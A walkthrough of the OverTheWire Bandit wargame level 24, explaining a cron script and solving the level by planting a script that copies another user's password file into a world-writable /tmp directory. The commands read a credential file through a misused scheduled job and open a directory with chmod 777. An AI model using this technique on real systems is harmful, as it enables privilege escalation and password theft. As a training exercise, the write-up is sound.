```
 __  __  __  _ __  _ _____   _   ___ _   _  ___ _     ___ _  _   
|  \/  \|  \| | _\| |_   _| | | | __| \ / || __| |   (_  | || |  
| -< /\ | | ' | v | | | |   | |_| _|`\ V /'| _|| |_   / /`._  _| 
|__/_||_|_|\__|__/|_| |_|   |___|___| \_/  |___|___| |___|  |_|
```
A program is running automatically at regular intervals from cron, the time-based job
scheduler. Look in `/etc/cron.d/` for the configuration and see what command is being
executed. This level requires us to create your own first shell-script. Keep in mind
that our shell script is removed once executed, so we may want to keep a copy around.
[^1]

Solution
----------------------------------------------------------------------------------------
Once again, we move to `/etc/cron.d/` to find out that the cronjob for *bandit24* runs
the `/usr/bin/cronjob_bandit24.sh` on a regular basis. So, we print its contents and
then try to understand what it does.
```bash
#!/bin/bash

shopt -s nullglob

myname=$(whoami)

cd /var/spool/"$myname"/foo || exit 
echo "Executing and deleting all scripts in /var/spool/$myname/foo:"
for i in * .*;
do
    if [ "$i" != "." ] && [ "$i" != ".." ];
    then
        echo "Handling $i"
        owner="$(stat --format "%U" "./$i")"
        if [ "${owner}" = "bandit23" ] && [ -f "$i" ]; then
            timeout -s 9 60 "./$i"
        fi
        rm -rf "./$i"
    fi
done
```
This bash script avoids errors if no files are matched with `shopt -s nullglob` and
stores the current name *bandit24* in a variable. Then, it attempts to move to the
directory `/var/spool/bandit24/foo` if it exists and executes and deletes all scripts
placed in this directory. Note, that in contrast to previous versions, this script
iterates over all files in the directory, including hidden ones, except the parent
`..` and current directory `.` to avoid recursion. Also, it makes sure to only run
those scripts, owned by the owner of the current level, *bandit23*. Finally, it does
delete all files in the directory, regardless of whether they were executed or not.
It is our job now, to create a shell script that prints the next level's password
in the `/var/spool/bandit24/foo` directory and wait for it to be executed by the
cronjob of the next level's user.

First, we create a temporary directory, for example `/tmp/bandit24-pwd/` and then
give everyone full permission on the system with `chmod 777 /tmp/bandit24-pwd/`.
Then, we create a file in the `/var/spool/bandit24/foo` directory and make it
executable.
```bash
echo 'cat /etc/bandit_pass/bandit24 > /tmp/bandit24-pwd/password.txt' > /var/spool/bandit24/foo/copy_password.sh;
chmod +x /var/spool/bandit24/foo/copy_password.sh
```
This script copies the password for the next level's user to a file in our newly
created directory. In turn, we wait up to a minute for the cron job to run it and
can then print the contents of `/tmp/bandit24-pwd/password.txt` for the next password.

[^1]: https://overthewire.org/wargames/bandit/bandit24.html
